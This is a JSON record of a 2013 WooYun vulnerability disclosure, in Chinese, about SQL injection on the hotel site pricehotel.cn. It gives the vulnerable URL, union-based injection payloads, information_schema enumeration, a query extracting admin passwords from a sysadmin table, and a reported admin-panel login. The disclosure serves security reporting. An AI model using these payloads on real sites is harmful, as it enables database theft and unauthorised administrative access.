{"id": 65046, "wybug_id": "wooyun-2013-019625", "wybug_title": "旅宿网SQL注入可登录后台随意操作", "wybug_corp": "旅宿网", "wybug_author": "微微笑", "wybug_date": "2013-08-25 21:21", "wybug_open_date": "2013-10-09 21:22", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-10-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可能在建站的时候没有考虑过安全问题，数据库可以直接接收用户输入进行查询，没有进过任何字符过滤、条件判断等安全处理，导致SQL注入问题，可脱库。 详细说明：  1.查找注入点http://www.pricehotel.cn/hskxread.php?id=1638\n\n 注入\t效果‘\t出错 and 1=1 \t正常 and 1=2 \t出错结论：可注入。 2.获取数据2.1 确定字段数http://www.pricehotel.cn/hskxread.php?id=1638 order by 20 --\n\n 依照此方法进行如下尝试：注入\t效果order by 20 --\t出错order by 10 --\t正常order by 12--\t出错order by 11 --\t正常结论：注入点查询的数据表有11列2.2 获得数据显示位置http://www.pricehotel.cn/hskxread.php?id=1638 and 1=2 union all select 1,2,3,4,5,6,7,8,9,10,11 --\n\n 信息：2，3，5处可利用来显示查询到的信息。2.3 获取数据库信息and 1=2 union all select 1,@@version,3,4,5,6,7,8,9,10,11 --图略 信息：数据库版本MySQL 5.5.23-log。2.4提取目标数据and 1=2 union all select 1,table_schema,3,4,5,6,7,8,9,10,11 from information_schema.tables—图略 信息：information_schema数据库。由于页面显示局限，仅能显示一条信息，不能罗列所有数据表，故采用工具。 \n\n若工具没有读出具体数据，只获取了表名、列名也可以手工注入获取数据信息。and 1=2 union select 1,admin_pwd,admin_name,4,5,6,7,8,9,10,11 from pricehoteldb.sysadmin --\n\n     漏洞证明：  3.查找后台http://www.pricehotel.cn/admin/login.php3.1尝试登陆\n\n 3.2登陆成功\n\n接下来的操作没有任何障碍，此处略。   修复方案：  验证所有输入处理特殊字符   版权声明：转载请注明来源 微微笑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}